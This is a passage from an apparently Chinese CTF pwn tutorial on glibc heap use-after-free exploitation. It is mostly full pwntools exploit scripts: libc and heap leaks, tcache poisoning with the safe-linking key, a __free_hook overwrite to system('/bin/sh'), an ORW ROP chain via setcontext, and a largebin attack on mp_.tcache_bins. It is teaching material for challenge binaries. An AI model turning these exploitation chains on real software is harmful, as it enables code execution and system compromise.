<span id="cb5-42"><a href="#cb5-42" aria-hidden="true"></a></span>
<span id="cb5-43"><a href="#cb5-43" aria-hidden="true"></a>add(<span class="bn">0x500</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></span>
<span id="cb5-44"><a href="#cb5-44" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></span>
<span id="cb5-45"><a href="#cb5-45" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></span>
<span id="cb5-46"><a href="#cb5-46" aria-hidden="true"></a>add(<span class="bn">0x70</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></span>
<span id="cb5-47"><a href="#cb5-47" aria-hidden="true"></a></span>
<span id="cb5-48"><a href="#cb5-48" aria-hidden="true"></a></span>
<span id="cb5-49"><a href="#cb5-49" aria-hidden="true"></a>delete(<span class="dv">0</span>)</span>
<span id="cb5-50"><a href="#cb5-50" aria-hidden="true"></a>show(<span class="dv">0</span>) <span class="co"># leak libc</span></span>
<span id="cb5-51"><a href="#cb5-51" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb5-52"><a href="#cb5-52" aria-hidden="true"></a>libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="dv">96</span><span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span></span>
<span id="cb5-53"><a href="#cb5-53" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</span>
<span id="cb5-54"><a href="#cb5-54" aria-hidden="true"></a>delete(<span class="dv">1</span>)</span>
<span id="cb5-55"><a href="#cb5-55" aria-hidden="true"></a>show(<span class="dv">1</span>) <span class="co"># leak heap &amp; key</span></span>
<span id="cb5-56"><a href="#cb5-56" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb5-57"><a href="#cb5-57" aria-hidden="true"></a>heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></span>
<span id="cb5-58"><a href="#cb5-58" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</span>
<span id="cb5-59"><a href="#cb5-59" aria-hidden="true"></a>delete(<span class="dv">2</span>)</span>
<span id="cb5-60"><a href="#cb5-60" aria-hidden="true"></a>key <span class="op">=</span> (heap_base<span class="op">+</span><span class="bn">0x1840</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span></span>
<span id="cb5-61"><a href="#cb5-61" aria-hidden="true"></a>fd <span class="op">=</span> key<span class="op">^</span>libc.sym[<span class="st">&#39;__free_hook&#39;</span>]</span>
<span id="cb5-62"><a href="#cb5-62" aria-hidden="true"></a>edit(<span class="dv">2</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</span>
<span id="cb5-63"><a href="#cb5-63" aria-hidden="true"></a></span>
<span id="cb5-64"><a href="#cb5-64" aria-hidden="true"></a>magic <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x14d09a</span></span>
<span id="cb5-65"><a href="#cb5-65" aria-hidden="true"></a>setcontext <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x529ad</span></span>
<span id="cb5-66"><a href="#cb5-66" aria-hidden="true"></a>leave_ret <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x5525c</span></span>
<span id="cb5-67"><a href="#cb5-67" aria-hidden="true"></a>heap <span class="op">=</span> heap_base<span class="op">+</span><span class="bn">0x1940</span></span>
<span id="cb5-68"><a href="#cb5-68" aria-hidden="true"></a>rop_addr <span class="op">=</span> heap<span class="op">+</span><span class="bn">0xb0</span></span>
<span id="cb5-69"><a href="#cb5-69" aria-hidden="true"></a></span>
<span id="cb5-70"><a href="#cb5-70" aria-hidden="true"></a>pop_rdi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000028a55</span></span>
<span id="cb5-71"><a href="#cb5-71" aria-hidden="true"></a>pop_rsi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000002a4cf</span></span>
<span id="cb5-72"><a href="#cb5-72" aria-hidden="true"></a>pop_rdx <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x00000000000c7f32</span></span>
<span id="cb5-73"><a href="#cb5-73" aria-hidden="true"></a>pop_rax <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000044c70</span></span>
<span id="cb5-74"><a href="#cb5-74" aria-hidden="true"></a>syscall <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000006105a</span></span>
<span id="cb5-75"><a href="#cb5-75" aria-hidden="true"></a>pop2 <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000018e4ba</span></span>
<span id="cb5-76"><a href="#cb5-76" aria-hidden="true"></a></span>
<span id="cb5-77"><a href="#cb5-77" aria-hidden="true"></a>rop <span class="op">=</span> p64(pop_rdi)</span>
<span id="cb5-78"><a href="#cb5-78" aria-hidden="true"></a>rop <span class="op">+=</span>p64(heap)</span>
<span id="cb5-79"><a href="#cb5-79" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rsi)</span>
<span id="cb5-80"><a href="#cb5-80" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">0</span>)</span>
<span id="cb5-81"><a href="#cb5-81" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdx)</span>
<span id="cb5-82"><a href="#cb5-82" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">0</span>)</span>
<span id="cb5-83"><a href="#cb5-83" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rax)</span>
<span id="cb5-84"><a href="#cb5-84" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">2</span>)</span>
<span id="cb5-85"><a href="#cb5-85" aria-hidden="true"></a>rop <span class="op">+=</span>p64(syscall)</span>
<span id="cb5-86"><a href="#cb5-86" aria-hidden="true"></a></span>
<span id="cb5-87"><a href="#cb5-87" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdi)</span>
<span id="cb5-88"><a href="#cb5-88" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">3</span>)</span>
<span id="cb5-89"><a href="#cb5-89" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rsi)</span>
<span id="cb5-90"><a href="#cb5-90" aria-hidden="true"></a>rop <span class="op">+=</span>p64(heap<span class="op">-</span><span class="bn">0x30</span>)</span>
<span id="cb5-91"><a href="#cb5-91" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdx)</span>
<span id="cb5-92"><a href="#cb5-92" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="bn">0x30</span>)</span>
<span id="cb5-93"><a href="#cb5-93" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rax)</span>
<span id="cb5-94"><a href="#cb5-94" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">0</span>)</span>
<span id="cb5-95"><a href="#cb5-95" aria-hidden="true"></a>rop <span class="op">+=</span>p64(syscall)</span>
<span id="cb5-96"><a href="#cb5-96" aria-hidden="true"></a></span>
<span id="cb5-97"><a href="#cb5-97" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rdi)</span>
<span id="cb5-98"><a href="#cb5-98" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">1</span>)</span>
<span id="cb5-99"><a href="#cb5-99" aria-hidden="true"></a>rop <span class="op">+=</span>p64(pop_rax)</span>
<span id="cb5-100"><a href="#cb5-100" aria-hidden="true"></a>rop <span class="op">+=</span>p64(<span class="dv">1</span>)</span>
<span id="cb5-101"><a href="#cb5-101" aria-hidden="true"></a>rop <span class="op">+=</span>p64(syscall)</span>
<span id="cb5-102"><a href="#cb5-102" aria-hidden="true"></a></span>
<span id="cb5-103"><a href="#cb5-103" aria-hidden="true"></a>add(<span class="bn">0x600</span>,<span class="st">&quot;./flag</span><span class="ch">\x00\x00</span><span class="st">&quot;</span><span class="op">+</span>p64(pop2)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(heap)<span class="op">+</span>p64(pop_rdi)<span class="op">+</span>p64(leave_ret)<span class="op">+</span>rop) <span class="co">#4</span></span>
<span id="cb5-104"><a href="#cb5-104" aria-hidden="true"></a>add(<span class="bn">0x70</span>,p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">9</span><span class="op">+</span>p64(heap)) <span class="co">#5</span></span>
<span id="cb5-105"><a href="#cb5-105" aria-hidden="true"></a></span>
<span id="cb5-106"><a href="#cb5-106" aria-hidden="true"></a>add(<span class="bn">0x70</span>,p64(magic)) <span class="co">#6</span></span>
<span id="cb5-107"><a href="#cb5-107" aria-hidden="true"></a></span>
<span id="cb5-108"><a href="#cb5-108" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(magic)</span>
<span id="cb5-109"><a href="#cb5-109" aria-hidden="true"></a></span>
<span id="cb5-110"><a href="#cb5-110" aria-hidden="true"></a>debug(p)</span>
<span id="cb5-111"><a href="#cb5-111" aria-hidden="true"></a></span>
<span id="cb5-112"><a href="#cb5-112" aria-hidden="true"></a>delete(<span class="dv">5</span>)</span>
<span id="cb5-113"><a href="#cb5-113" aria-hidden="true"></a><span class="co"># debug(p)</span></span>
<span id="cb5-114"><a href="#cb5-114" aria-hidden="true"></a>p.interactive()</span>
<span id="cb5-115"><a href="#cb5-115" aria-hidden="true"></a></span>
<span id="cb5-116"><a href="#cb5-116" aria-hidden="true"></a><span class="co">&#39;&#39;&#39;</span></span>
<span id="cb5-117"><a href="#cb5-117" aria-hidden="true"></a><span class="co">0x000000000014d09a: mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28]; </span></span>
<span id="cb5-118"><a href="#cb5-118" aria-hidden="true"></a><span class="co">&#39;&#39;&#39;</span></span></code></pre></div>
<h2 id="x02-只有小堆块的uaf">0x02 只有小堆块的UAF</h2>
<p>同样由于存在UAF，可以先利用UAF堆叠构造大堆块来泄露libc，之后同上操作。</p>
<p>简单来说可以利用tcache的UAF来在heap上申请出另一个堆来修改其他堆的size进行堆风水。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a>local <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a><span class="cf">if</span> local:</span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a><span class="cf">else</span>:</span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a>    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a><span class="kw">def</span> debug(p):</span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>    <span class="cf">if</span> local:</span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a>        gdb.attach(p)</span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a>    <span class="cf">else</span>:</span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a>        <span class="cf">pass</span></span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a></span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true"></a><span class="kw">def</span> cmd(i):</span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true"></a></span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true"></a><span class="kw">def</span> add(size,data):</span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true"></a>    cmd(<span class="dv">1</span>)</span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true"></a></span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true"></a><span class="kw">def</span> show(idx):</span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true"></a>    cmd(<span class="dv">4</span>)</span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true"></a></span>
<span id="cb6-33"><a href="#cb6-33" aria-hidden="true"></a><span class="kw">def</span> delete(idx):</span>
<span id="cb6-34"><a href="#cb6-34" aria-hidden="true"></a>    cmd(<span class="dv">2</span>)</span>
<span id="cb6-35"><a href="#cb6-35" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb6-36"><a href="#cb6-36" aria-hidden="true"></a></span>
<span id="cb6-37"><a href="#cb6-37" aria-hidden="true"></a><span class="kw">def</span> edit(idx,data):</span>
<span id="cb6-38"><a href="#cb6-38" aria-hidden="true"></a>    cmd(<span class="dv">3</span>)</span>
<span id="cb6-39"><a href="#cb6-39" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb6-40"><a href="#cb6-40" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb6-41"><a href="#cb6-41" aria-hidden="true"></a></span>
<span id="cb6-42"><a href="#cb6-42" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></span>
<span id="cb6-43"><a href="#cb6-43" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></span>
<span id="cb6-44"><a href="#cb6-44" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></span>
<span id="cb6-45"><a href="#cb6-45" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></span>
<span id="cb6-46"><a href="#cb6-46" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;4444&quot;</span>) <span class="co">#4</span></span>
<span id="cb6-47"><a href="#cb6-47" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;5555&quot;</span>) <span class="co">#5</span></span>
<span id="cb6-48"><a href="#cb6-48" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;6666&quot;</span>) <span class="co">#6</span></span>
<span id="cb6-49"><a href="#cb6-49" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;7777&quot;</span>) <span class="co">#7</span></span>
<span id="cb6-50"><a href="#cb6-50" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;8888&quot;</span>) <span class="co">#8</span></span>
<span id="cb6-51"><a href="#cb6-51" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;9999&quot;</span>) <span class="co">#9</span></span>
<span id="cb6-52"><a href="#cb6-52" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;aaaa&quot;</span>) <span class="co">#10</span></span>
<span id="cb6-53"><a href="#cb6-53" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;bbbb&quot;</span>) <span class="co">#11</span></span>
<span id="cb6-54"><a href="#cb6-54" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;cccc&quot;</span>) <span class="co">#12</span></span>
<span id="cb6-55"><a href="#cb6-55" aria-hidden="true"></a></span>
<span id="cb6-56"><a href="#cb6-56" aria-hidden="true"></a>delete(<span class="dv">0</span>)</span>
<span id="cb6-57"><a href="#cb6-57" aria-hidden="true"></a>show(<span class="dv">0</span>)</span>
<span id="cb6-58"><a href="#cb6-58" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb6-59"><a href="#cb6-59" aria-hidden="true"></a>heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></span>
<span id="cb6-60"><a href="#cb6-60" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</span>
<span id="cb6-61"><a href="#cb6-61" aria-hidden="true"></a>delete(<span class="dv">1</span>)</span>
<span id="cb6-62"><a href="#cb6-62" aria-hidden="true"></a>fd <span class="op">=</span> ((heap_base<span class="op">+</span><span class="bn">0x1000</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span>)<span class="op">^</span>(heap_base<span class="op">+</span><span class="bn">0x1390</span>)</span>
<span id="cb6-63"><a href="#cb6-63" aria-hidden="true"></a>edit(<span class="dv">1</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</span>
<span id="cb6-64"><a href="#cb6-64" aria-hidden="true"></a></span>
<span id="cb6-65"><a href="#cb6-65" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;dddd&quot;</span>) <span class="co">#13</span></span>
<span id="cb6-66"><a href="#cb6-66" aria-hidden="true"></a>add(<span class="bn">0x78</span>,p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">3</span><span class="op">+</span>p64(<span class="bn">0x481</span>)) <span class="co">#14</span></span>
<span id="cb6-67"><a href="#cb6-67" aria-hidden="true"></a>delete(<span class="dv">2</span>)</span>
<span id="cb6-68"><a href="#cb6-68" aria-hidden="true"></a>show(<span class="dv">2</span>) <span class="co"># leak libc</span></span>
<span id="cb6-69"><a href="#cb6-69" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb6-70"><a href="#cb6-70" aria-hidden="true"></a>libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="dv">96</span><span class="op">-</span><span class="bn">0x10</span></span>
<span id="cb6-71"><a href="#cb6-71" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</span>
<span id="cb6-72"><a href="#cb6-72" aria-hidden="true"></a></span>
<span id="cb6-73"><a href="#cb6-73" aria-hidden="true"></a>delete(<span class="dv">4</span>)</span>
<span id="cb6-74"><a href="#cb6-74" aria-hidden="true"></a>delete(<span class="dv">5</span>)</span>
<span id="cb6-75"><a href="#cb6-75" aria-hidden="true"></a>fd <span class="op">=</span> ((heap_base<span class="op">+</span><span class="bn">0x1530</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span>)<span class="op">^</span>(libc.sym[<span class="st">&#39;__free_hook&#39;</span>])</span>
<span id="cb6-76"><a href="#cb6-76" aria-hidden="true"></a>edit(<span class="dv">5</span>,p64(fd))</span>
<span id="cb6-77"><a href="#cb6-77" aria-hidden="true"></a>add(<span class="bn">0x78</span>,<span class="st">&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>) <span class="co">#15</span></span>
<span id="cb6-78"><a href="#cb6-78" aria-hidden="true"></a>add(<span class="bn">0x78</span>,p64(libc.sym[<span class="st">&#39;system&#39;</span>])) <span class="co">#16</span></span>
<span id="cb6-79"><a href="#cb6-79" aria-hidden="true"></a></span>
<span id="cb6-80"><a href="#cb6-80" aria-hidden="true"></a>delete(<span class="dv">15</span>)</span>
<span id="cb6-81"><a href="#cb6-81" aria-hidden="true"></a></span>
<span id="cb6-82"><a href="#cb6-82" aria-hidden="true"></a><span class="co"># debug(p)</span></span>
<span id="cb6-83"><a href="#cb6-83" aria-hidden="true"></a>p.interactive()</span></code></pre></div>
<blockquote>
<p>同样如果开启seccomp沙盒只能ORW，方法参考0x01，只是一个堆块一般可能写不下rop，可以考虑调用sysread或者多个堆块拼凑</p>
</blockquote>
<h2 id="x03-只有大堆块的uaf">0x03 只有大堆块的UAF</h2>
<p>这个比较好玩，我的主要思路就是LargebinAttack修改mp_.tcache_bins来改大对tcache大小范围的判断，之后还是打hook一把梭。</p>
<p>LargebinAttack简单来说就是首先构造下面的堆布局</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a>add(<span class="bn">0x428</span>)<span class="co">#0</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a>add(<span class="bn">0x408</span>)<span class="co">#1</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a>add(<span class="bn">0x418</span>)<span class="co">#2</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a>add(<span class="bn">0x408</span>)<span class="co">#3</span></span></code></pre></div>
<p>其中chunk1和chunk3只是为了隔开chunk0和chunk2</p>
<p>之后释放chunk0并申请一个更大的chunk让chunk0进入largebin,然后再释放chunk2</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a>delete(<span class="dv">0</span>)</span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a>add(<span class="bn">0x438</span>)<span class="co">#4</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a>delete(<span class="dv">2</span>)</span></code></pre></div>
<p>之后修改chunk0的bk_nextsize为&amp;target-0x20，再申请一个大chunk即可实现修改&amp;target</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a>add(<span class="bn">0x438</span>)<span class="co">#5</span></span></code></pre></div>
<p><strong>mp_.tcache_bins</strong>中保存了最大tcache的size值，默认是0x80，修改它可以让大chunk都进入tcache。</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a>local <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a><span class="cf">if</span> local:</span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a>    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true"></a><span class="cf">else</span>:</span>
<span id="cb10-13"><a href="#cb10-13" aria-hidden="true"></a>    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</span>
<span id="cb10-14"><a href="#cb10-14" aria-hidden="true"></a></span>
<span id="cb10-15"><a href="#cb10-15" aria-hidden="true"></a><span class="kw">def</span> debug(p):</span>
<span id="cb10-16"><a href="#cb10-16" aria-hidden="true"></a>    <span class="cf">if</span> local:</span>
<span id="cb10-17"><a href="#cb10-17" aria-hidden="true"></a>        gdb.attach(p)</span>
<span id="cb10-18"><a href="#cb10-18" aria-hidden="true"></a>    <span class="cf">else</span>:</span>
<span id="cb10-19"><a href="#cb10-19" aria-hidden="true"></a>        <span class="cf">pass</span></span>
<span id="cb10-20"><a href="#cb10-20" aria-hidden="true"></a></span>
<span id="cb10-21"><a href="#cb10-21" aria-hidden="true"></a><span class="kw">def</span> cmd(i):</span>
<span id="cb10-22"><a href="#cb10-22" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</span>
<span id="cb10-23"><a href="#cb10-23" aria-hidden="true"></a></span>
<span id="cb10-24"><a href="#cb10-24" aria-hidden="true"></a><span class="kw">def</span> add(size,data<span class="op">=</span><span class="st">&quot;&quot;</span>):</span>
<span id="cb10-25"><a href="#cb10-25" aria-hidden="true"></a>    cmd(<span class="dv">1</span>)</span>
<span id="cb10-26"><a href="#cb10-26" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</span>
<span id="cb10-27"><a href="#cb10-27" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb10-28"><a href="#cb10-28" aria-hidden="true"></a></span>
<span id="cb10-29"><a href="#cb10-29" aria-hidden="true"></a><span class="kw">def</span> show(idx):</span>
<span id="cb10-30"><a href="#cb10-30" aria-hidden="true"></a>    cmd(<span class="dv">4</span>)</span>
<span id="cb10-31"><a href="#cb10-31" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb10-32"><a href="#cb10-32" aria-hidden="true"></a></span>
<span id="cb10-33"><a href="#cb10-33" aria-hidden="true"></a><span class="kw">def</span> delete(idx):</span>
<span id="cb10-34"><a href="#cb10-34" aria-hidden="true"></a>    cmd(<span class="dv">2</span>)</span>
<span id="cb10-35"><a href="#cb10-35" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb10-36"><a href="#cb10-36" aria-hidden="true"></a></span>
<span id="cb10-37"><a href="#cb10-37" aria-hidden="true"></a><span class="kw">def</span> edit(idx,data):</span>
<span id="cb10-38"><a href="#cb10-38" aria-hidden="true"></a>    cmd(<span class="dv">3</span>)</span>
<span id="cb10-39"><a href="#cb10-39" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</span>
<span id="cb10-40"><a href="#cb10-40" aria-hidden="true"></a>    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</span>
<span id="cb10-41"><a href="#cb10-41" aria-hidden="true"></a></span>
<span id="cb10-42"><a href="#cb10-42" aria-hidden="true"></a>add(<span class="bn">0x428</span>)<span class="co">#0</span></span>
<span id="cb10-43"><a href="#cb10-43" aria-hidden="true"></a>add(<span class="bn">0x408</span>)<span class="co">#1</span></span>
<span id="cb10-44"><a href="#cb10-44" aria-hidden="true"></a>add(<span class="bn">0x418</span>)<span class="co">#2</span></span>
<span id="cb10-45"><a href="#cb10-45" aria-hidden="true"></a>add(<span class="bn">0x408</span>)<span class="co">#3</span></span>
